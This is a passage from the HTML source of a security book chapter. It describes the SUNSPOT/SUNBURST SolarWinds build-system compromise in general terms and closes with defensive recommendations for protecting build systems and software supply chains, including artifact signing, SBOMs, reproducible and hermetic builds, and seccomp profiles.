later, the infamous SolarWinds Hotfix 5 DLL containing the malicious implant was made available to customers, and once
the threat actor confirmed that customers were infected, it removed its malware from the build VMs.</p>

<p>It was a further six months before the customer infections<a data-type="indexterm" data-primary="SUNBURST" data-secondary="attack timeline" data-startref="SUN_timeline" id="idm45302814456464"/><a data-type="indexterm" data-primary="attacks" data-secondary="SUNBURST" data-tertiary="timeline" data-startref="atak_timlin" id="idm45302814455136"/> were identified.</p>

<p>This SUNSPOT malware changed source code immediately before
it was compiled and immediately back to its original form
afterwards, as shown in <a data-type="xref" href="#sunspot-malware">Figure 4-11</a>. This required observing the filesystem and changing its contents.</p>

<figure><div id="sunspot-malware" class="figure">
<img src="Images/haku_0411.png" alt="SUNSPOT Malware" width="1430" height="545"/>
<h6><span class="label">Figure 4-11. </span>SUNSPOT malware</h6>
</div></figure>

<p>A build-stage signing tool that verifies its inputs and outputs (as in-toto does) then invokes a subprocess to perform a
build step may be immune to this variant of the attack, although it may turn security into a race condition between the
in-toto hash function and the malware that modifies the filesystem.</p>

<p class="pagebreak-before">Bear in mind that if an attacker has control of your build environment, they can potentially modify any files in it.
Although this is bad, they cannot regenerate signatures made outside the build: this is why your <a data-type="indexterm" data-primary="cryptographic signing" data-secondary="SUNSPOT malware and" id="idm45302814448416"/>cryptographically
signed artifacts are safer than unsigned binary blobs or Git code. Tampering of signed or checksummed artifacts can be
detected because attackers are unlikely to have the private keys to, for example, sign tampered data.</p>

<p>SUNSPOT changed the files that were about to be compiled. In a container build, the same problem exists: the local
filesystem must be trusted. Signing the inputs and validating outputs goes some way to mitigating this attack, but a
motivated attacker with full control of a build system may be impossible to disambiguate from build activity.</p>

<p>It may not be possible to entirely protect a build system without a complete implementation of all supply chain security
recommendations. Your organization’s ultimate risk appetite should be used to determine how much effort you wish to
expend protecting this vital, vulnerable part of your system: for example, critical infrastructure projects may wish to
fully audit the hardware and software they receive, root chains of trust in hardware modules wherever possible, and
strictly regulate the employees permitted to interact with build systems. For most organizations, this will<a data-type="indexterm" data-primary="SUNSPOT" data-startref="SUNSP" id="idm45302814445312"/><a data-type="indexterm" data-primary="malware" data-secondary="SUNSPOT" data-startref="mal_SUNSP" id="idm45302814444336"/> be deeply
impractical.</p>
<div data-type="tip"><h6>Tip</h6>
<p><a href="https://oreil.ly/nojb6">Nixpkgs</a> (utilized in NixOS) <a href="https://oreil.ly/Rd1WB">bootstraps deterministically</a> from<a data-type="indexterm" data-primary="Nixpkgs" id="idm45302814440608"/> a small collection of tools. This is perhaps the ultimate in reproducible builds, with
some useful security side effects; it allows end-to-end trust and reproducibility for all images built from it.</p>

<p><a href="https://oreil.ly/flKAf">Trustix</a>, another Nix<a data-type="indexterm" data-primary="Trustix" id="idm45302814438624"/> project, compares build outputs against a Merkle tree log across multiple untrusted build servers to determine if a build has been compromised.</p>
</div>

<p>So these recommendations might not truly prevent supply chain compromise like SUNBURST, but they can protect some of the
attack vectors and reduce your total risk exposure. To protect your <a data-type="indexterm" data-primary="build systems, protecting" id="idm45302814436880"/>build system:</p>

<ul>
<li>
<p>Give developers root access to integration and testing environments, <em>not</em> build and packaging systems.</p>
</li>
<li>
<p>Use ephemeral build infrastructure and protect builds from cache poisoning.</p>
</li>
<li>
<p>Generate and distribute SBOMs so consumers can validate the artifacts.</p>
</li>
<li>
<p>Run intrusion detection on build servers.</p>
</li>
<li>
<p>Scan open source libraries and operating system packages.</p>
</li>
<li>
<p>Create reproducible builds on distributed infrastructure and compare the results to detect tampering.</p>
</li>
<li>
<p>Run hermetic, self-contained builds that only use what’s made available to them (instead of calling out to other systems or the internet), and avoid decision logic in build scripts.</p>
</li>
<li>
<p>Keep builds simple and easy to reason about, and security review and scan the build scripts like any other software.</p>
</li>
</ul>
</div></section>













<section data-type="sect1" data-pdf-bookmark="Conclusion"><div class="sect1" id="idm45302814469232">
<h1>Conclusion</h1>

<p>Supply chain attacks are difficult to defend completely. Malicious software on public container registries is often
detected rather than prevented, with the same for application libraries, and potential insecurity is part of the
reality of using any third-party software.</p>

<p>The <a href="https://slsa.dev">SLSA Framework</a> suggests <a data-type="indexterm" data-primary="supply chains" data-secondary="SLSA Framework" id="idm45302814424288"/><a data-type="indexterm" data-primary="pipelines" data-secondary="SLSA Framework" id="idm45302814423280"/><a data-type="indexterm" data-primary="security" data-secondary="pipelines" data-tertiary="SLSA Framework" id="idm45302814422336"/>the milestones to achieve in order to secure your supply chain,
assuming your build infrastructure is already secure! The <a href="https://oreil.ly/8qXmY">Software Supply Chain Security paper</a> details<a data-type="indexterm" data-primary="supply chains" data-secondary="Software Supply Chain Security paper" id="idm45302814420192"/><a data-type="indexterm" data-primary="Software Supply Chain Security paper" id="idm45302814419248"/><a data-type="indexterm" data-primary="pipelines" data-secondary="Software Supply Chain Security paper" id="idm45302814418560"/><a data-type="indexterm" data-primary="security" data-secondary="pipelines" data-tertiary="Software Supply Chain Security paper" id="idm45302814417600"/> concrete patterns and practices for Source Code, Materials, Build Pipelines, Artifacts, and Deployments, to guide you on your supply chain security voyage.</p>

<p>Scanning container images and Git repositories for published CVEs is a  cloud native application’s minimal viable security. If you
assume all workloads are potentially hostile, your container security context and configuration should be tuned to match
the workload’s sensitivity. Container <code>seccomp</code> and LSM profiles should always be configured to defend against new,
undefined behavior or system calls from a freshly compromised dependency.</p>

<p>Sign your build artifacts with cosign, Notary, and in-toto during CI/CD, then validate their signatures whenever they are
consumed. Distribute SBOMs so consumers
can verify your dependency chain for new vulnerabilities. While these measures only contribute to wider supply chain
security coverage, they frustrate attackers and decrease BCTL’s risk of falling prey to drive-by container pirates.</p>
</div></section>







</div></section></div></body></html>